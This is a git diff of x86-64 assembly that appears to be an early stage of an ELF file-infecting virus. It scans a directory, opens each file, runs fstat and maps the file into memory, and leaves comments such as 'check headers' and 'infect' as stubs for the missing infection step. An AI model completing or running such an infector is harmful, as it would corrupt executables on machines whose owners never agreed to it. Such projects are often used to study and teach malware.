@@ -1,11 +1,4 @@
-%define DIRENT_SIZE 1024
-struc	linux_dirent
-	.d_ino			resq	1
-	.d_off			resq	1
-	.d_reclen		resw	1
-  .d_type     resb  1
-	.d_name			resb	1
-endstruc
+%include "war.s"
 
 section .text
   global _start
@@ -77,6 +70,7 @@ hello:
 _start:
   push rbp
   mov rbp, rsp
+  ; deactivate signals?
 
   sub rsp, 0x2710;0x430 ; char buf[1024]
   mov rcx, 0 ; O_RDONLY
@@ -99,7 +93,7 @@ _start:
   mov [rbp - 0x41c], rax ; num = 0
   mov rax, [rbp - 0x41c] ; load num in rax
   cmp rax, [rbp - 0x424] ; while (num < res)
-  jge .end
+  jge end
 
   .while:
     mov rax, [rbp - 0x41c] ; rax = num
@@ -123,21 +117,47 @@ _start:
 
       cmp rax, 0
       jl .next_file
+      mov [rbp - 0x430], rax ; store fd 
       mov rax, rdi
       call ft_write
       lea r15, [rbp - 0x2710]
       .stat:
-        mov rax, 4 ; stat syscall
-        ; rdi already has d_name
+        mov rax, 5 ; fstat syscall
+        mov rdi, [rbp - 0x430] ; load fd
         mov rsi, r15 ; statbuf struct
         syscall
 
+        cmp rax, 0
+        jl .next_file ; if error continue to next_file
+        ; mov r14, [r15 + 168] ; store target original ehdr.entry 
+
+        ; mmap
+        ; mmap(NULL, buf.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0))
+        mov rdi, 0 ; NULL
+        mov rsi, [r15 + stat.st_size]; buf.st_size
+        mov rdx, 3 ; PROT_READ | PROT_WRITE
+        mov r10, 2; MAP_PRIVATE
+        mov r8, [rbp - 0x430] ; fd
+        mov r9, 0;  offset
+        mov rax, 9 ; mmap syscall
+        syscall
+
+        cmp rax, 0; if error continue SCOTT modified to stop
+        jl end ; .next_file
+
+        ; check headers
+        ; infect
+        ; munmap
+        ; close
+
+
     .next_file
-      mov rbx, [rbp - 0x41c]
-      cmp rbx, [rbp - 0x424] ; compare num with res
+      mov rbx, [rbp - 0x41c] ; 
+      cmp rbx, [rbp - 0x424] ; compare num with result from getdents64
       jl .while
 
-  .end:
+  end:
+    ; reactivate signals?
     mov ebx, 0 ; exitcode 0
     mov eax, 1 ; exit syscall
     int 0x80 ; execute syscall
